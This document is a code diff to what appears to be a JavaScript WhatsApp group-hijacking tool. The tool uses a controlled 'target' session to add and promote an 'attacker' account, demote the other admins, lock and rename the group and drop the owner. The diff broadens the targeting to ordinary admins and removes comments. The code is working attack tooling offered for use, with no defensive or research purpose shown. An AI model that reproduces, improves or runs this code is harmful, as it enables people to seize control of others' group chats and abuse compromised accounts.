@@ -39,7 +39,6 @@ async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log
 async function lockAndRename(attackerSock, groupJid, log) {
     let locked = false, renamed = false, announced = false;
 
-    // Force metadata refresh before acting
     try { await attackerSock.groupMetadata(groupJid); } catch {}
     await sleep(3000);
 
@@ -86,7 +85,13 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
     });
 
     if (!targetPart) { result.aborted = true; result.reason = 'target not in group'; return result; }
-    if (rankOf(targetPart) !== 2) { result.aborted = true; result.reason = 'target not superadmin'; return result; }
+    
+    // FIX: Accept regular admins (1) as well as superadmins (2)
+    if (rankOf(targetPart) < 1) { 
+        result.aborted = true; 
+        result.reason = 'target is not an admin'; 
+        return result; 
+    }
 
     // 2 — Scan Contests
     onPhase?.('sᴄᴀɴ sᴜᴘᴇʀᴀᴅᴍɪɴs');
@@ -127,7 +132,7 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
     result.added = true;
     await sleep(3000);
 
-    // 4 — PROMOTE ATTACKER (The critical fix)
+    // 4 — PROMOTE ATTACKER
     onPhase?.('ᴘʀᴏᴍᴏᴛᴇ ᴀᴛᴛᴀᴄᴋᴇʀ');
     try { 
         await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); 
@@ -142,14 +147,12 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
         return result; 
     }
 
-    // 5 — JOINT DEMOTION (Split workload)
+    // 5 — JOINT DEMOTION
     onPhase?.('ᴅᴇᴍᴏᴛᴇ ᴀᴅᴍɪɴs');
     const otherAdmins = meta.participants.filter(p => p !== targetPart && rankOf(p) === 1).map(p => p.id);
     
     if (otherAdmins.length > 0) {
-        // Target does 70% of the demotions
         const targetChunk = otherAdmins.slice(0, Math.ceil(otherAdmins.length * 0.7));
-        // Attacker does 30% of the demotions
         const attackerChunk = otherAdmins.slice(Math.ceil(otherAdmins.length * 0.7));
 
         if (targetChunk.length > 0) {
@@ -175,7 +178,7 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
 
     // 7 — Target Leaves
     onPhase?.('ᴛᴀʀɢᴇᴛ ʟᴇᴀᴠᴇs');
-    await sleep(3000); // Let WA settle before dropping the owner
+    await sleep(3000); 
     try { await targetSock.groupLeave(groupJid); result.left = true; }
     catch (e) { log?.(`[hijack:leave] ${e.message}`); }
 
